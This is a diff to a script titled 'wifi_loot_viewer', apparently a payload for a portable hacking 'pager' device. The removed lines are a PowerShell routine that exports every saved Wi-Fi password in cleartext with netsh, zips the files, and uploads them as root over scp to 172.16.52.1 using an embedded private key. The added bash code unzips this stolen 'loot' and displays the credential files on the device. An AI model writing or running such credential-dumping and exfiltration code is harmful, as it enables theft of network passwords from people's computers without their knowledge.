@@ -1,90 +1,90 @@
 #!/bin/bash
-# Title: wifi loot viewer
+# Title: wifi_loot_viewer
 # Author: f3bandit
 # Description: Simple xml viewer that unzips all zip files in /mmc/root/loot/wifi then lists all xml files in /mmc/root/loot/wifi
 # to be viewed thru the log viewer.
-# Version: 1.2
+# Version: 1.3
 
-# Creates a dir named wifi in the %TEMP% dir
-mkdir "$env:TEMP\wifi"
+TARGET_DIR="/mmc/root/loot/wifi"
+TMP_FILE="/tmp/pager_xml_view.txt"
 
-#Exports all wifi credentials
-netsh wlan show profiles
+# ---- sanity checks ----
+if [ ! -d "$TARGET_DIR" ]; then
+    ERROR_DIALOG "Directory not found"
+    exit 0
+fi
 
-# Dumps all wifi credentials to seperate .xml files
-netsh wlan export profile key=clear folder="$env:TEMP\wifi"
+if ! command -v unzip >/dev/null 2>&1; then
+    ERROR_DIALOG "unzip not installed"
+    exit 0
+fi
 
-# Creats an archive of all files named wifi.zip in %TEMP%\wifi
-Compress-Archive -Path "$env:TEMP\wifi\*" -DestinationPath "$env:TEMP\wifi\wifi.zip" -Force
+# ---- unzip all zip files in target dir ----
+START_SPINNER
 
-# wifi pager scp upload cmd using public key instead of password to upload to pager
-$ErrorActionPreference = "Stop"
+FOUND_ZIP=0
 
-# ---- CONFIG ----
-$PagerIP   = "172.16.52.1"
-$PagerUser = "root"
-$LocalFile = Join-Path $env:TEMP "wifi\wifi.zip"
-$RemoteDir = "/mmc/root/loot/wifi/"
-$TempKey   = Join-Path $env:TEMP ("pager_key_" + [guid]::NewGuid().ToString())
+while IFS= read -r -d '' zipfile; do
+    FOUND_ZIP=1
+    unzip -o "$zipfile" -d "$TARGET_DIR" >/dev/null 2>&1
+done < <(find "$TARGET_DIR" -maxdepth 1 -type f -iname "*.zip" -print0)
 
-# ---- PASTE BASE64 OF YOUR WORKING PRIVATE KEY FILE BELOW ----
-$PrivateKeyB64 = @'INSERT AUTHORIZED HERE 
-'@
+STOP_SPINNER
 
-function Test-CommandExists {
-    param([string]$Name)
-    [bool](Get-Command $Name -ErrorAction SilentlyContinue)
-}
+# ---- completion popup, user dismisses and continues ----
+PROMPT "All loot files processed!"
 
-try {
-    if (-not (Test-Path $LocalFile)) {
-        throw "File not found: $LocalFile"
-    }
+# ---- build XML file list ----
+mapfile -t XML_FILES < <(find "$TARGET_DIR" -maxdepth 1 -type f -iname "*.xml" | sort)
 
-    if (-not (Test-CommandExists "scp")) {
-        throw "scp not found in PATH"
-    }
+if [ "${#XML_FILES[@]}" -eq 0 ]; then
+    ERROR_DIALOG "No XML files found"
+    exit 0
+fi
 
-    if (-not (Test-CommandExists "ssh-keygen")) {
-        throw "ssh-keygen not found in PATH"
-    }
+# ---- build full display names for picker ----
+OPTIONS=()
+for f in "${XML_FILES[@]}"; do
+    # pass full basename with no manual truncation so pager firmware can handle long-name scrolling
+    OPTIONS+=("$(basename "$f")")
+done
 
-    $keyBytes = [Convert]::FromBase64String(($PrivateKeyB64 -replace '\s',''))
-    [IO.File]::WriteAllBytes($TempKey, $keyBytes)
+DEFAULT="${OPTIONS[0]}"
 
-    if (-not (Test-Path $TempKey)) {
-        throw "Failed to create temporary key file"
-    }
+# ---- let the pager render the list natively ----
+SELECTED=$(LIST_PICKER "XML Viewer" "${OPTIONS[@]}" "$DEFAULT") || exit 0
 
-    icacls $TempKey /inheritance:r | Out-Null
-    icacls $TempKey /grant:r "$($env:USERNAME):(R)" | Out-Null
+SELECTED_PATH=""
+for f in "${XML_FILES[@]}"; do
+    if [ "$(basename "$f")" = "$SELECTED" ]; then
+        SELECTED_PATH="$f"
+        break
+    fi
+done
 
-    & ssh-keygen -y -f $TempKey | Out-Null
-    if ($LASTEXITCODE -ne 0) {
-        throw "Embedded private key is invalid or unreadable"
-    }
+if [ -z "$SELECTED_PATH" ] || [ ! -f "$SELECTED_PATH" ]; then
+    ERROR_DIALOG "Selected file missing"
+    exit 0
+fi
 
-    & ssh-keygen -R $PagerIP | Out-Null 2>$null
+# ---- format XML if xmllint exists, else copy raw ----
+START_SPINNER
+if command -v xmllint >/dev/null 2>&1; then
+    xmllint --format "$SELECTED_PATH" > "$TMP_FILE" 2>/dev/null || cp "$SELECTED_PATH" "$TMP_FILE"
+else
+    cp "$SELECTED_PATH" "$TMP_FILE"
+fi
+STOP_SPINNER
 
-    & scp `
-        -i $TempKey `
-        -o StrictHostKeyChecking=accept-new `
-        -o IdentitiesOnly=yes `
-        $LocalFile `
-        "${PagerUser}@${PagerIP}:${RemoteDir}"
+# ---- show selected XML in log viewer ----
+LOG clear
+LOG blue "XML Viewer"
+LOG blue "File: $SELECTED"
+LOG blue "Path: $SELECTED_PATH"
+LOG blue "--------------------------------"
 
-    if ($LASTEXITCODE -ne 0) {
-        throw "scp failed with exit code $LASTEXITCODE"
-    }
+while IFS= read -r line; do
+    LOG "$line"
+done < "$TMP_FILE"
 
-    Write-Host "Upload SUCCESS: $LocalFile -> ${PagerUser}@${PagerIP}:${RemoteDir}"
-}
-catch {
-    Write-Error $_.Exception.Message
-    exit 1
-}
-finally {
-    if (Test-Path $TempKey) {
-        Remove-Item $TempKey -Force -ErrorAction SilentlyContinue
-    }
-}
+exit 0
